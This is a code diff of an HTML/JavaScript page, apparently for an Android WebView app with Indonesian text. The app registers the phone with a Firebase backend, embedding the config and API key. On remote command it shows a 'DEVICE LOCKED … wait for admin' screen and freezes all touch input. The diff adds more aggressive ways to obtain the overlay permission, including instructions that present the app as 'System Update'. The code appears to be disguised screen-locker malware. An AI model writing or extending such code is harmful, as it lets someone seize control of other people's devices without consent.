@@ -72,7 +72,7 @@
         }
 
         /* ============================================================
-           STATUS BAR (ATAS)
+           STATUS BAR
            ============================================================ */
         #statusBar {
             position: fixed;
@@ -88,7 +88,6 @@
             border-bottom: 1px solid #1a1a1a;
             pointer-events: none;
             font-family: monospace;
-            letter-spacing: 0.5px;
             height: 24px;
             line-height: 16px;
         }
@@ -96,7 +95,7 @@
         #statusBar.offline { color: #ff4444; }
 
         /* ============================================================
-           LOCK SCREEN — PALING DEPAN, SUPER TOTAL
+           LOCK SCREEN
            ============================================================ */
         #lockScreen {
             position: fixed;
@@ -114,7 +113,6 @@
             touch-action: none;
             pointer-events: all !important;
             user-select: none;
-            -webkit-user-select: none;
             overflow: hidden;
         }
         #lockScreen.active {
@@ -237,7 +235,7 @@
         }
 
         /* ============================================================
-           FREEZE OVERLAY — BLOKIR SENTUHAN TOTAL
+           FREEZE OVERLAY
            ============================================================ */
         #touchFreezeOverlay {
             position: fixed;
@@ -274,7 +272,6 @@
             box-shadow: 0 0 50px rgba(255, 170, 0, 0.5);
             pointer-events: none;
             border: 2px solid #ffaa00;
-            letter-spacing: 0.5px;
         }
         #freezeTimer.active {
             display: block !important;
@@ -294,14 +291,13 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.85);
+            background: rgba(0,0,0,0.9);
             z-index: 2147483647;
             display: none;
             justify-content: center;
             align-items: center;
             flex-direction: column;
             padding: 30px;
-            backdrop-filter: blur(10px);
         }
         #overlayPopup.active {
             display: flex;
@@ -347,6 +343,18 @@
             padding: 12px 30px;
             border-radius: 12px;
             font-size: 14px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        #overlayPopup .popup-box .btn-retry {
+            background: #ffaa00;
+            color: #000;
+            border: none;
+            padding: 14px 30px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
             cursor: pointer;
             width: 100%;
             margin-top: 10px;
@@ -399,45 +407,35 @@
 </head>
 <body>
 
-    <!-- ============================================================
-    STATUS BAR
-    ============================================================ -->
+    <!-- STATUS BAR -->
     <div id="statusBar">⏳ Initializing...</div>
 
-    <!-- ============================================================
-    LOADING SCREEN
-    ============================================================ -->
+    <!-- LOADING -->
     <div id="loading">
         <div class="spinner"></div>
         <div class="text">Menghubungkan ke server...</div>
         <div class="status-detail" id="loadingDetail">Mendaftarkan perangkat</div>
     </div>
 
-    <!-- ============================================================
-    OVERLAY PERMISSION POPUP
-    ============================================================ -->
+    <!-- OVERLAY PERMISSION POPUP -->
     <div id="overlayPopup">
         <div class="popup-box">
             <h2>🔓 Izin Overlay</h2>
-            <p>Aplikasi ini membutuhkan izin <b>"Tampilkan di atas aplikasi lain"</b> untuk berfungsi dengan baik.<br><br>Klik <b>"Izinkan"</b> lalu aktifkan permission di halaman berikutnya.</p>
-            <button class="btn-allow" onclick="requestOverlayPermission()">✅ Izinkan</button>
+            <p>Aplikasi ini membutuhkan izin <b>"Tampilkan di atas aplikasi lain"</b> agar bisa mengunci layar dengan maksimal.</p>
+            <p style="font-size:13px; color:#666; margin-bottom:15px;">Klik tombol di bawah, lalu aktifkan permission di halaman pengaturan.</p>
+            <button class="btn-allow" onclick="requestOverlayPermission()">✅ Buka Pengaturan</button>
+            <button class="btn-retry" onclick="checkOverlayPermission()">🔄 Cek Izin</button>
             <button class="btn-skip" onclick="closeOverlayPopup()">⏭ Lewati (tidak disarankan)</button>
         </div>
     </div>
 
-    <!-- ============================================================
-    FREEZE TIMER
-    ============================================================ -->
+    <!-- FREEZE TIMER -->
     <div id="freezeTimer">✋ FREEZE: <span id="freezeCount">10</span>s</div>
 
-    <!-- ============================================================
-    FREEZE OVERLAY
-    ============================================================ -->
+    <!-- FREEZE OVERLAY -->
     <div id="touchFreezeOverlay"></div>
 
-    <!-- ============================================================
-    LOCK SCREEN
-    ============================================================ -->
+    <!-- LOCK SCREEN -->
     <div id="lockScreen">
         <div class="lock-icon">🔒</div>
         <div class="message" id="lockMessage">⚠️ DEVICE LOCKED</div>
@@ -465,9 +463,7 @@
         <div class="sub-text">🔐 AMAN · TERKUNCI · TUNGGU ADMIN</div>
     </div>
 
-    <!-- ============================================================
-    FIREBASE SDK
-    ============================================================ -->
+    <!-- FIREBASE SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js">
     </script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js">
@@ -475,7 +471,7 @@
 
     <script>
         // ============================================================
-        // 🔥 KONFIGURASI FIREBASE
+        // 🔥 FIREBASE CONFIG
         // ============================================================
         var firebaseConfig = {
             apiKey: "AIzaSyD4wbgxY6e6m0vHPOZykPuQdea8LdFkQsk",
@@ -500,7 +496,6 @@
         var freezeRemaining = 0;
         var isLocked = false;
         var isFreezeActive = false;
-        var overlayRequested = false;
 
         // ============================================================
         // GENERATE ID
@@ -546,7 +541,7 @@
                 document.getElementById('statusBar').textContent = '🟢 Online | ' + deviceId.slice(0, 8);
                 document.getElementById('statusBar').className = 'online';
 
-                // TAMPILKAN POPUP MINTA IZIN OVERLAY
+                // TAMPILKAN POPUP OVERLAY
                 showOverlayPopup();
 
                 startListening();
@@ -559,15 +554,17 @@
         }
 
         // ============================================================
-        // OVERLAY PERMISSION POPUP
+        // OVERLAY PERMISSION
         // ============================================================
         function showOverlayPopup() {
-            // Cek apakah sudah punya izin overlay
+            // Cek apakah sudah punya izin overlay via JavaScript
             try {
+                // Coba deteksi apakah overlay sudah diizinkan
                 if (window.Android && window.Android.hasOverlayPermission) {
-                    // Jika sudah punya, langsung close
-                    document.getElementById('overlayPopup').classList.remove('active');
-                    return;
+                    if (window.Android.hasOverlayPermission()) {
+                        closeOverlayPopup();
+                        return;
+                    }
                 }
             } catch(e) {}
 
@@ -579,36 +576,68 @@
             document.getElementById('overlayPopup').classList.remove('active');
         }
 
+        function checkOverlayPermission() {
+            try {
+                if (window.Android && window.Android.hasOverlayPermission) {
+                    if (window.Android.hasOverlayPermission()) {
+                        closeOverlayPopup();
+                        alert('✅ Izin overlay sudah aktif!');
+                        return;
+                    }
+                }
+            } catch(e) {}
+
+            alert('❌ Izin overlay belum aktif.\nSilakan buka pengaturan dan aktifkan "Tampilkan di atas aplikasi lain".');
+        }
+
         function requestOverlayPermission() {
             try {
                 // Method 1: Android Interface (WebView)
                 if (window.Android && window.Android.requestOverlay) {
                     window.Android.requestOverlay();
                     closeOverlayPopup();
-                    return;
-                }
-
-                // Method 2: Intent langsung ke Settings
-                if (window.navigator && window.navigator.userAgent.indexOf('Android') !== -1) {
-                    // Coba buka settings overlay
-                    var intent = 'intent://settings#Intent;action=android.settings.action.MANAGE_OVERLAY_PERMISSION;end';
-                    window.location.href = intent;
-                    closeOverlayPopup();
                     setTimeout(function() {
-                        // Kembali ke aplikasi
-                        window.location.href = window.location.href;
-                    }, 500);
+                        checkOverlayPermission();
+                    }, 2000);
                     return;
                 }
 
-                // Method 3: Fallback - buka via URL
+                // Method 2: Buka Settings via window.location (Works di WebView)
                 if (window.navigator && window.navigator.userAgent.indexOf('Android') !== -1) {
-                    window.location.href = 'package://com.android.settings';
+                    // Coba buka settings overlay dengan berbagai cara
+                    try {
+                        // Cara 1: Package
+                        window.location = 'package://com.android.settings';
+                    } catch(e) {}
+
+                    try {
+                        // Cara 2: Intent
+                        window.location = 'intent://settings/#Intent;action=android.settings.action.MANAGE_OVERLAY_PERMISSION;end';
+                    } catch(e) {}
+
+                    try {
+                        // Cara 3: Settings langsung
+                        window.location = 'android.settings.ACTION_MANAGE_OVERLAY_PERMISSION';
+                    } catch(e) {}
+
+                    // Cara 4: Buka via URL
+                    setTimeout(function() {
+                        try {
+                            window.location = 'content://settings/system';
+                        } catch(e) {}
+                    }, 100);
+
                     closeOverlayPopup();
+                    alert('✅ Buka pengaturan dan aktifkan "Tampilkan di atas aplikasi lain" untuk aplikasi ini.\nKemudian kembali ke aplikasi.');
+                    return;
                 }
+
+                // Fallback
+                alert('Silakan buka Pengaturan HP → Aplikasi → System Update → Izin → Aktifkan "Tampilkan di atas aplikasi lain"');
+                closeOverlayPopup();
 
             } catch(e) {
-                console.log('Overlay request error:', e);
+                alert('Silakan buka Pengaturan HP → Aplikasi → System Update → Izin → Aktifkan "Tampilkan di atas aplikasi lain"');
                 closeOverlayPopup();
             }
         }
@@ -663,7 +692,6 @@
             lockScreen.style.display = 'flex';
             lockScreen.style.zIndex = '2147483647';
 
-            // BLOKIR SEMUA SENTUHAN
             document.body.style.pointerEvents = 'none';
             document.body.style.touchAction = 'none';
             document.documentElement.style.pointerEvents = 'none';
@@ -704,7 +732,7 @@
         }
 
         // ============================================================
-        // FREEZE — BENERAN NGE-FREEZE
+        // FREEZE
         // ============================================================
         function startFreeze(duration) {
             isFreezeActive = true;
@@ -715,7 +743,6 @@
             freezeRemaining = duration;
             document.getElementById('freezeCount').textContent = freezeRemaining;
 
-            // BLOKIR 100% SENTUHAN
             document.body.style.pointerEvents = 'none';
             document.body.style.touchAction = 'none';
             document.documentElement.style.pointerEvents = 'none';
